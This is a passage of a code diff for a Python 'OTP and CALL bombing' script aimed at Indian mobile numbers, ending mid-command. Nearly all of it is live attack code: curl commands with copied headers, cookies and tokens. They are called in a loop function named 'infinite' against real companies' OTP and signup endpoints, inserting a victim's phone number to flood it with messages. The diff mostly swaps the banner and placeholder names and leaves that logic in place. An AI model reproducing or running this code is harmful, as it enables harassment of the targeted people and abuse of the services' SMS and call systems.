@@ -1,22 +1,32 @@
 import random
-from requests import get
-import argparse
+import urllib.request
 import os
 import time
 import sys
 
-def check():
-    try:
-        get("https://www.dopesatan.ml/")
-        internet = True
-        print(color)
-        print("\t\t\t Bombing Started...")
-    except:
-        print(color)
-        print(
-            "\tYou are not Conected to Internet. Please Turn on your Mobile Data"
-        )
-        exit()
+
+def banner():
+    os.system('''
+    printf "\n"
+    printf "         ████████╗███████╗██╗   ██╗███╗   ██╗ █████╗ ███╗   ███╗██╗\n"
+    printf "         ╚══██╔══╝██╔════╝██║   ██║████╗  ██║██╔══██╗████╗ ████║██║\n"
+    printf "            ██║   ███████╗██║   ██║██╔██╗ ██║███████║██╔████╔██║██║\n"
+    printf "            ██║   ╚════██║██║   ██║██║╚██╗██║██╔══██║██║╚██╔╝██║██║\n"
+    printf "            ██║   ███████║╚██████╔╝██║ ╚████║██║  ██║██║ ╚═╝ ██║██║\n"
+    printf "            ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝\n\n"
+    printf "\e[1;32m         ╔════════════════════════════════════════════════════════╗\n"
+    printf "\e[1;32m         ║         \e[0m\e[1;95m OTP and CALL Bombing Python Script  \e[1;32m          ║\n"
+    printf "\e[1;32m         ║      \e[0m\e[1;95m Developed by:\e[31m DopeSatan - Utsanjan Maity\e[1;32m         ║\n"
+    printf "\e[1;32m         ║  \e[0m\e[1;95m Only Indian mobile numbers are currently supported\e[1;32m   ║\n"
+    printf "\e[1;32m         ╚════════════════════════════════════════════════════════╝\n"
+    printf "\n"
+    printf "         \e[101m\e[1;77m                                                          \e[0m\n"
+    printf "         \e[101m\e[1;77m      DISCLAIMER:~ Developer will not be responsible      \e[0m\n"
+    printf "         \e[101m\e[1;77m      for any misuse or damage caused by this script      \e[0m\n"
+    printf "         \e[101m\e[1;77m     Please do not use this script for taking Revenge     \e[0m\n"
+    printf "         \e[101m\e[1;77m                                                          \e[0m\n"
+    printf "\n"
+        ''')
 
 
 def infinite(target, color, msgs):
@@ -50,9 +60,9 @@ def infinite(target, color, msgs):
         times = times + 1
         os.popen(
             '''
-                        curl -X POST -H "Host:mobile.medplusindia.com" -H "content-length:238" -H "accept:application/json, text/plain, */*" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded" -H "origin:https://www.medplusmart.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d 'recieveUpdates=1&firstName=Sparky&lastName=Hacker&emailId=sparkyknd@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber='''
+                        curl -X POST -H "Host:mobile.medplusindia.com" -H "content-length:238" -H "accept:application/json, text/plain, */*" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded" -H "origin:https://www.medplusmart.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d 'recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber='''
             + target +
-            '''&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false' "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl" --output sparky > /dev/null 2>&1
+            '''&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false' "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl" --output Logfile > /dev/null 2>&1
                         ''')
         times = times + 1
 
@@ -81,7 +91,7 @@ def infinite(target, color, msgs):
             '''
                         curl -X POST -H "Host:www.fbbonline.in" -H "content-length:432" -H "accept:application/json, text/javascript, */*; q=0.01" -H "x-newrelic-id:VQ8PVlFUChABV1ZRBgYCX1w=" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "origin:https://www.fbbonline.in" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.fbbonline.in/customer/account/create" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:historyPlpPage=0" -H "cookie:_gcl_au=1.1.282636412.1600839866" -H "cookie:_gat=1" -H "cookie:_gid=GA1.2.727597189.1600839866" -H "cookie:_ga=GA1.2.1662893346.1600839866" -H "cookie:all_store_details=null" -H "cookie:registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F" -H "cookie:_fbp=fb.1.1600839858758.1597042975" -H "cookie:_fv=cmpnpp" -H "cookie:_st_time=1600839856" -H "cookie:PHPSESSID=7id6ar9g0g6ou64f5fk2ur43o4" -d 'YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D='''
             + target +
-            '''&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=sparkyklund%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=' "https://www.fbbonline.in/customer/account/GenerateOtp" > /dev/null 2>&1
+            '''&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=' "https://www.fbbonline.in/customer/account/GenerateOtp" > /dev/null 2>&1
                         ''')
         times = times + 1
 
@@ -118,9 +128,9 @@ def infinite(target, color, msgs):
 
         os.popen(
             '''
-                        curl -X POST -H "Host:www.dream11.com" -H "content-length:316" -H "accept:*/*" -H "device:pwa" -H "x-csrf:fb1f1947-4547-392d-9a28-a9de30d9e766" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://www.dream11.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.dream11.com/register?ru=" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:WZRK_S_W4R-49K-494Z=%7B%22p%22%3A1%2C%22s%22%3A1600795342%2C%22t%22%3A1600795361%7D" -H "cookie:WZRK_G=dc2112f4850746a0b8b47c233471fe4a" -H "cookie:ajs_anonymous_id=%2218835b7c-2e60-48c2-a6c4-79dc7e7c169a%22" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:dh_user_id=25fdcb20-fcf8-11ea-b0df-81d0899f30b6" -H "cookie:__csrf=fb1f1947-4547-392d-9a28-a9de30d9e766" -d '{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"sparxmr0@gmail.com","mobileNumber":"'''
+                        curl -X POST -H "Host:www.dream11.com" -H "content-length:316" -H "accept:*/*" -H "device:pwa" -H "x-csrf:fb1f1947-4547-392d-9a28-a9de30d9e766" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://www.dream11.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.dream11.com/register?ru=" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:WZRK_S_W4R-49K-494Z=%7B%22p%22%3A1%2C%22s%22%3A1600795342%2C%22t%22%3A1600795361%7D" -H "cookie:WZRK_G=dc2112f4850746a0b8b47c233471fe4a" -H "cookie:ajs_anonymous_id=%2218835b7c-2e60-48c2-a6c4-79dc7e7c169a%22" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:dh_user_id=25fdcb20-fcf8-11ea-b0df-81d0899f30b6" -H "cookie:__csrf=fb1f1947-4547-392d-9a28-a9de30d9e766" -d '{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"tsunami@gmail.com","mobileNumber":"'''
             + target +
-            '''","password":"Lund@1234Bur"}}' "https://www.dream11.com/graphql/mutation/pwa/register"  > /dev/null 2>&1
+            '''","password":"tsunami@123astronomia"}}' "https://www.dream11.com/graphql/mutation/pwa/register"  > /dev/null 2>&1
                                 ''')
         times = times + 1
 
@@ -128,7 +138,7 @@ def infinite(target, color, msgs):
             '''
                         curl -X POST -H "Host:doubtnut.com" -H "content-length:16" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded" -H "accept:*/*" -H "origin:https://doubtnut.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://doubtnut.com/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:_ga=GA1.2.Y4Twn8bPt-E_czB_KcZojHFWtwN8UXp0QqtZRS2guBCZwJcdygTIRbxblqqhLv1I" -H "cookie:_ga_TW5C6PT68C=GS1.1.1600795082.1.1.1600795141.0" -H "cookie:_gid=GA1.2.809074082.1600795083" -H "cookie:a_1=5a223bcd-d40d-40c4-b83f-837e3dd460f2" -d 'phone='''
             + target +
-            '''' "https://doubtnut.com/api/v1/user/login" --output sparky > /dev/null 2>&1  
+            '''' "https://doubtnut.com/api/v1/user/login" --output Logfile > /dev/null 2>&1  
                                 ''')
         times = times + 1
 
@@ -136,7 +146,7 @@ def infinite(target, color, msgs):
             '''
                         curl -X POST -H "Host:user.vedantu.com" -H "content-length:74" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:*/*" -H "origin:https://www.vedantu.com" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.vedantu.com/masterclass?utm_source=in&utm_medium=in_ggl_cpa&utm_campaign=ggl_Brand_Search&utm_term=ggl_Brand_Search_Exact_Brand_Vedantu&utm_content=in_Brand_Search_Exact_Brand_Vedantu_Ad2&gclsrc=aw.ds&&gclid=CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:_gcl_dc=GCL.1600794527.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE" -H "cookie:_gcl_aw=GCL.1600794527.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE" -H "cookie:moe_uuid=6a221a22-79b0-4a05-87a6-bb6ccc786f4e" -H "cookie:WZRK_S_8WR-895-K74Z=%7B%22p%22%3A1%2C%22s%22%3A1600794521%2C%22t%22%3A1600794520%7D" -H "cookie:km_lv=1600794517" -H "cookie:kvcd=1600794517298" -H "cookie:_gac_UA-52838179-3=1.1600792907.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE" -H "cookie:_gid=GA1.2.1580594851.1600792840" -H "cookie:_ga=GA1.2.999929697.1600792840" -H "cookie:USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%226a221a22-79b0-4a05-87a6-bb6ccc786f4e%22%2C%22deviceAdded%22%3Atrue%7D" -H "cookie:_fbp=fb.1.1600792808706.1882458684" -H "cookie:_gcl_au=1.1.1765065041.1600792806" -H "cookie:WZRK_G=9d0490f3acc94a80a8feafc7aaa146b0" -H "cookie:km_vs=1" -H "cookie:km_ai=qEioHmXYYtngAVbnv7c6PZcDSIM%3D" -d '{"email":null,"phoneCode":"+91","phoneNumber":"'''
             + target +
-            '''","ver":"11.345"}' "https://user.vedantu.com/user/preLoginVerification" --output sparky  > /dev/null 2>&1
+            '''","ver":"11.345"}' "https://user.vedantu.com/user/preLoginVerification" --output Logfile  > /dev/null 2>&1
                         ''')
         times = times + 1
 
@@ -144,7 +154,7 @@ def infinite(target, color, msgs):
             '''
                         curl -X POST -H "Host:unacademy.com" -H "content-length:107" -H "accept:*/*" -H "authorization:Bearer undefined" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://unacademy.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://unacademy.com/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:_gat_UA-69016858-2=1" -H "cookie:_anonymous_id=M-67682" -H "cookie:lux_uid=160079427639164156" -H "cookie:anonymous_session_id=3d4cc928-6a73-4f39-a10f-5c0d381ea8e7" -H "cookie:mp_535208d541f9b5935ef91a365b0439e1_mixpanel=%7B%22distinct_id%22%3A%20%22174b6b07ce059-08b01b7f2fd04-1d7a0a2f-42cc0-174b6b07ce2d6%22%2C%22%24device_id%22%3A%20%22174b6b07ce059-08b01b7f2fd04-1d7a0a2f-42cc0-174b6b07ce2d6%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22utm_source%22%3A%20%22google%22%2C%22utm_medium%22%3A%20%22cpc%22%2C%22utm_campaign%22%3A%20%221944493080%22%2C%22utm_content%22%3A%20%22%7Bcontent%7D%22%2C%22utm_term%22%3A%20%22unacademy%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22Platform%22%3A%20%22Desktop%22%7D" -H "cookie:loginRoute=%2F" -H "cookie:_gat=1" -H "cookie:_gac_UA-69016858-2=1.1600792925.CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE" -H "cookie:_gcl_aw=GCL.1600792920.CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE" -H "cookie:afUserId=d196d301-85b9-45ee-8a34-a66d1ed0a1aa-c" -H "cookie:_ttgclid=CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE" -H "cookie:_ttgclid=CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE" -H "cookie:_gid=GA1.2.2120759531.1600792879" -H "cookie:_ga=GA1.2.1664858815.1600792879" -H "cookie:_fbp=fb.1.1600792863709.1257609187" -H "cookie:source=google" -H "cookie:_gcl_au=1.1.762851911.1600792854" -d '{"phone":"'''
             + target +
-            '''","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' "https://unacademy.com/api/v3/user/user_check/" --output sparky  > /dev/null 2>&1
+            '''","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' "https://unacademy.com/api/v3/user/user_check/" --output Logfile  > /dev/null 2>&1
                         ''')
         times = times + 1
 
@@ -152,7 +162,7 @@ def infinite(target, color, msgs):
             '''
                         curl -X POST -H "Host:bcas-prod.byjusweb.com" -H "content-length:46" -H "accept:*/*" -H "origin:https://byjus.com" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/x-www-form-urlencoded" -H "referer:https://byjus.com/byjus-classes-book-a-free-demo-class/registration/?utm_source=google&utm_mode=CPA&utm_campaign=K12-Brand-Android-BYJU%27S-India-Apr10&utm_term=byjus&gclid=EAIaIQobChMIzKCzs5396wIVVqqWCh0TgQO4EAAYASAAEgK-V_D_BwE" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -d 'phoneNumber='''
             + target +
-            '''&page=free-trial-classes' "https://bcas-prod.byjusweb.com/api/send-otp" --output sparky  > /dev/null 2>&1
+            '''&page=free-trial-classes' "https://bcas-prod.byjusweb.com/api/send-otp" --output Logfile  > /dev/null 2>&1
                         ''')
         times = times + 1
 
@@ -187,9 +197,9 @@ def infinite(target, color, msgs):
             '''"}' "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile"  > /dev/null 2>&1
                         ''')
         times = times + 1
-        cmd = '''curl -X POST -H "Host:1.rome.api.flipkart.com" -H "Connection:keep-alive" -H "Content-Length:338" -H "x-user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile" -H "Origin:https://www.flipkart.com" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" -H "Cookie:T=BR%3Ackfcu8grn0xqvyyvwni4yxp6o.1600711394531; vh=632; vw=360; dpr=2; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18527%7CMCMID%7C76403100668224989248663375062116515669%7CMCAAMLH-1601316203%7C12%7CMCAAMB-1601316203%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1600718605s%7CNONE%7CMCAID%7CNONE; s_cc=true; S=d1t14P0w/Pz8/Pz8/P3MSPyJaPxDnS+xX3DDqgNzmvw1zqm7YyImq0FXfp+hM4pKH58SFBsLxvXQ+P8Cz8lO4CyVM5w==; SN=VI40F03BF14E7C4B628CD08259542FE831.TOKC0B6874C268A424DB5DCA004325C0C2F.1600711730.LO; gpv_pn=LOGIN_V4_MOBILE; gpv_pn_t=dynamic; s_sq=flipkart-mob-web%3D%2526pid%253DLOGIN_V4_MOBILE%2526pidt%253D1%2526oid%253Dfunctiongr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT" -d '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"''' + target + '''","clientQueryParamMap":{"ret":"/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135","entryPage":"HOMEPAGE_HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}' "https://1.rome.api.flipkart.com/1/action/view" --output sparky > /dev/null 2>&1  '''
+        cmd = '''curl -X POST -H "Host:1.rome.api.flipkart.com" -H "Connection:keep-alive" -H "Content-Length:338" -H "x-user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile" -H "Origin:https://www.flipkart.com" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" -H "Cookie:T=BR%3Ackfcu8grn0xqvyyvwni4yxp6o.1600711394531; vh=632; vw=360; dpr=2; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18527%7CMCMID%7C76403100668224989248663375062116515669%7CMCAAMLH-1601316203%7C12%7CMCAAMB-1601316203%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1600718605s%7CNONE%7CMCAID%7CNONE; s_cc=true; S=d1t14P0w/Pz8/Pz8/P3MSPyJaPxDnS+xX3DDqgNzmvw1zqm7YyImq0FXfp+hM4pKH58SFBsLxvXQ+P8Cz8lO4CyVM5w==; SN=VI40F03BF14E7C4B628CD08259542FE831.TOKC0B6874C268A424DB5DCA004325C0C2F.1600711730.LO; gpv_pn=LOGIN_V4_MOBILE; gpv_pn_t=dynamic; s_sq=flipkart-mob-web%3D%2526pid%253DLOGIN_V4_MOBILE%2526pidt%253D1%2526oid%253Dfunctiongr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT" -d '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"''' + target + '''","clientQueryParamMap":{"ret":"/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135","entryPage":"HOMEPAGE_HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}' "https://1.rome.api.flipkart.com/1/action/view" --output Logfile > /dev/null 2>&1  '''
         times = times + 1
-        cmd2 = '''curl -X GET -H "Host:img1a.flixcart.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier=''' + target + '''&loginIdentifierPrefix=%2B91&sourceContext=default&ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&supportedAuthenticationTypes=password&churned=false" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png" --output sparky > /dev/null 2>&1 '''
+        cmd2 = '''curl -X GET -H "Host:img1a.flixcart.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier=''' + target + '''&loginIdentifierPrefix=%2B91&sourceContext=default&ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&supportedAuthenticationTypes=password&churned=false" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png" --output Logfile > /dev/null 2>&1 '''
         os.popen(cmd)
         times = times + 1
         os.popen(cmd2)
@@ -210,7 +220,7 @@ def infinite(target, color, msgs):
         os.popen('''
                         curl -X POST -H "Host:ogonn.in" -H "content-length:65" -H "accept:application/json, text/javascript, */*; q=0.01" -H "origin:https://ogonn.in" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://ogonn.in/login" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:laravel_session=eyJpdiI6Ik9UWFwvZzlxdEozVk5ITmZGYnhQM1F3PT0iLCJ2YWx1ZSI6IituT2hPUDd0eWFhdHI2RFNjRk9GXC91Vk9DOXRaV295TzFrc041ZnAwNjNuaEJSZkxaU0JzN2FvbXNxVzA1S2trIiwibWFjIjoiMTU4YjdmYzFkMzZiNTdkMjhjZDA3MGY2YjllNTcxMzMwODU3ZjQ5ZGY2NTcyMzE5ZDhlNWFlMjNhZjc3MWYyOCJ9" -H "cookie:XSRF-TOKEN=eyJpdiI6IkVWVEMrUW80TU1rc2U1R1pza1E2b1E9PSIsInZhbHVlIjoidWxPYUxYamtqaVh2QVFjNzlsVlZadHE2TG5VWlVPalwvN0xmTDJcLzFJSzBSaTFvSisxZmxnVmZrb20rdkQ5UkE3IiwibWFjIjoiOTZiZTA1MmM1ZTZhY2Q2NGNkYjAwOTBjZmUzMTJlNzNmNGVmMzgxYzU5ZmZhODc3ZmJkZWMwZmRjNjk4N2UxYSJ9" -H "cookie:_fbp=fb.1.1600717201907.1836998376" -d '_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile='''
                  + target +
-                 '''' "https://ogonn.in/otp" --output sparky > /dev/null 2>&1 
+                 '''' "https://ogonn.in/otp" --output Logfile > /dev/null 2>&1 
                         ''')
         times = times + 1
 
@@ -218,15 +228,15 @@ def infinite(target, color, msgs):
             '''
                         curl -X POST -H "Host:digital.aakash.ac.in" -H "content-length:30" -H "accept:*/*" -H "origin:https://digital.aakash.ac.in" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://digital.aakash.ac.in/online-courses?utm_source=Google_Search&utm_medium=Paid&utm_content=Online_Classes_GS&utm_campaign=Srch_Generic_GS_Exact_2020_Rxm&utm_term=online%20study%20courses&gclid=EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:_co_session_active=1" -H "cookie:_gac_UA-132222061-1=1.1600720006.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE" -H "cookie:_gid=GA1.3.1265004790.1600719997" -H "cookie:_ga=GA1.3.1759859626.1600719997" -H "cookie:_fbp=fb.2.1600720004859.138019050" -H "cookie:_gat_UA-132222061-1=1" -H "cookie:_gac_UA-132222061-1=1.1600719997.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE" -H "cookie:_gid=GA1.4.1265004790.1600719997" -H "cookie:_ga=GA1.4.1759859626.1600719997" -H 